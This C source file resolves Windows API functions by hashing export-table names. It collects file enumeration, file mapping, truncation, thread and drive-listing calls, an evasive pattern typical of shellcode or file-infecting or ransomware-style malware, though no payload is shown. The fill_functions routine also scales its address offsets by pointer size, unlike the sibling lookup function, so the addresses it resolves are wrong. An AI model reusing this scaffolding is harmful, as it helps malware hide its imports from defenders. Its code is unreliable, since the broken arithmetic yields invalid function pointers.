#include "functions.h"
#include "checksum.h"
#include "checksum_list.h"

static void memzero(void *start, uint32_t size);

int fill_functions(IMAGE_EXPORT_DIRECTORY *ed, void *base,
                   functions_t *functions) {
    uint32_t *namePtr = (uint32_t *)((uint8_t *)base + ed->AddressOfNames);
    uint32_t *addrPtr = (uint32_t *)((uint8_t *)base + ed->AddressOfFunctions);
    uint16_t *nameOrdinalsPtr =
        (uint16_t *)((uint8_t *)base + ed->AddressOfNameOrdinals);
    int functionCounter = 0;

    memzero((void *)functions, sizeof(functions_t));

    for (uint32_t i = 0; i < ed->NumberOfNames; i++) {
        void *functionAddr =
            (void *)((void **)base + *(addrPtr + *nameOrdinalsPtr));
        switch (checksum((const char *)base + *namePtr)) {
        case CS_EXITPROCESS:
            functions->exitProcess = (fpExitProcess)functionAddr;
            break;
        case CS_GETTICKCOUNT:
            functions->getTickCount = (fpGetTickCount)functionAddr;
            break;
        case CS_GETPROCESSHEAP:
            functions->getProcessHeap = (fpGetProcessHeap)functionAddr;
            break;
        case CS_HEAPALLOC:
            functions->heapAlloc = (fpHeapAlloc)functionAddr;
            break;
        case CS_HEAPFREE:
            functions->heapFree = (fpHeapFree)functionAddr;
            break;
        case CS_FINDFIRSTFILEA:
            functions->findFirstFileA = (fpFindFirstFileA)functionAddr;
            break;
        case CS_FINDNEXTFILEA:
            functions->findNextFileA = (fpFindNextFileA)functionAddr;
            break;
        case CS_FINDCLOSE:
            functions->findClose = (fpFindClose)functionAddr;
            break;
        case CS_CREATEFILEA:
            functions->createFileA = (fpCreateFileA)functionAddr;
            break;
        case CS_GETFILESIZE:
            functions->getFileSize = (fpGetFileSize)functionAddr;
            break;
        case CS_CREATEFILEMAPPINGA:
            functions->createFileMappingA = (fpCreateFileMappingA)functionAddr;
            break;
        case CS_MAPVIEWOFFILE:
            functions->mapViewOfFile = (fpMapViewOfFile)functionAddr;
            break;
        case CS_FLUSHVIEWOFFILE:
            functions->flushViewOfFile = (fpFlushViewOfFile)functionAddr;
            break;
        case CS_UNMAPVIEWOFFILE:
            functions->unmapViewOfFile = (fpUnmapViewOfFile)functionAddr;
            break;
        case CS_SETFILEPOINTER:
            functions->setFilePointer = (fpSetFilePointer)functionAddr;
            break;
        case CS_SETENDOFFILE:
            functions->setEndOfFile = (fpSetEndOfFile)functionAddr;
            break;
        case CS_CLOSEHANDLE:
            functions->closeHandle = (fpCloseHandle)functionAddr;
            break;
        case CS_CREATETHREAD:
            functions->createThread = (fpCreateThread)functionAddr;
            break;
        case CS_GETLOGICALDRIVES:
            functions->getLogicalDrives = (fpGetLogicalDrives)functionAddr;
            break;
        case CS_SLEEP:
            functions->sleep = (fpSleep)functionAddr;
            break;
        default:
            functionCounter--;
            break;
        }
        functionCounter++;
        namePtr++;
        nameOrdinalsPtr++;
    }
    return functionCounter;
}

void *get_function_by_checksum(IMAGE_EXPORT_DIRECTORY *ed, void *base,
                               uint32_t cs) {
    uint32_t *namePtr = (uint32_t *)((uint8_t *)base + ed->AddressOfNames);
    uint32_t *addrPtr = (uint32_t *)((uint8_t *)base + ed->AddressOfFunctions);
    uint16_t *nameOrdinalsPtr =
        (uint16_t *)((uint8_t *)base + ed->AddressOfNameOrdinals);

    for (uint32_t i = 0; i < ed->NumberOfNames; i++) {
        if (checksum((const char *)base + *namePtr) == cs) {
            return (void *)((uint8_t *)base + *(addrPtr + *nameOrdinalsPtr));
        }
        namePtr++;
        nameOrdinalsPtr++;
    }
    return NULL;
}

static void memzero(void *start, uint32_t size) {

    for (uint8_t *ptr = start; ptr < (uint8_t *)start + size; ptr++) {
        *ptr = 0;
    }
}
